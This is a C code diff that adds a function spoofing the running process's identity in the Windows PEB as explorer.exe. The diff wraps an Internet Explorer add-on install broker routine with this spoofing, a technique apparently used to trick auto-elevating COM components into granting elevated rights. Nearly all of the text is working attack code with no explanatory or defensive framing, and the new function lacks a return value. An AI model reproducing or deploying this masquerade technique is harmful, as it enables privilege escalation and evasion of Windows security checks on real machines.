@@ -368,6 +368,40 @@ CLEANUP:
 	return Result;
 }
 
+BOOL MasqueradeProcessPath
+(
+	_In_ LPWSTR lpNewPath,
+	_In_ BOOL Restore,
+	_Inout_opt_ LPWSTR* pOldPath
+)
+{
+	PPEB pPeb = NULL;
+	LPVOID lpImagePathName = NULL;
+	LPWSTR lpCommandLine = NULL;
+
+	pPeb = NtCurrentPeb();
+	if (!Restore) {
+		lpImagePathName = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+		lstrcpyW(lpImagePathName, lpNewPath);
+		lpCommandLine = PathFindFileNameW(lpImagePathName);
+		pOldPath[0] = pPeb->ProcessParameters->ImagePathName.Buffer;
+		pOldPath[1] = pPeb->ProcessParameters->CommandLine.Buffer;
+	}
+	else {
+		lpImagePathName = pOldPath[0];
+		lpCommandLine = pOldPath[1];
+	}
+
+	RtlAcquirePebLock();
+	if (Restore) {
+		VirtualFree(pPeb->ProcessParameters->ImagePathName.Buffer, 0, MEM_RELEASE);
+	}
+
+	RtlInitUnicodeString(&pPeb->ProcessParameters->ImagePathName, lpImagePathName);
+	RtlInitUnicodeString(&pPeb->ProcessParameters->CommandLine, lpCommandLine);
+	RtlReleasePebLock();
+}
+
 BOOL IeAddOnInstallMethod
 (
 	_In_ PBYTE pBuffer,
@@ -396,7 +430,13 @@ BOOL IeAddOnInstallMethod
 	BSTR EmptyBstr = NULL;
 	HANDLE hProc = NULL;
 	BOOL Result = FALSE;
+	WCHAR wszExplorerPath[MAX_PATH];
+	LPWSTR OldPath[2];
 
+	RtlSecureZeroMemory(wszExplorerPath, sizeof(wszExplorerPath));
+	GetWindowsDirectoryW(wszExplorerPath, _countof(wszExplorerPath));
+	lstrcatW(wszExplorerPath, L"\\explorer.exe");
+	MasqueradeProcessPath(wszExplorerPath, FALSE, OldPath);
 	hResultInit = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
 	hResult = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_CONNECT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);
 	if (FAILED(hResult)) {
@@ -471,6 +511,7 @@ BOOL IeAddOnInstallMethod
 
 	Result = TRUE;
 CLEANUP:
+	MasqueradeProcessPath(NULL, TRUE, OldPath);
 	if (InstallBroker) {
 		InstallBroker->lpVtbl->Release(InstallBroker);
 	}
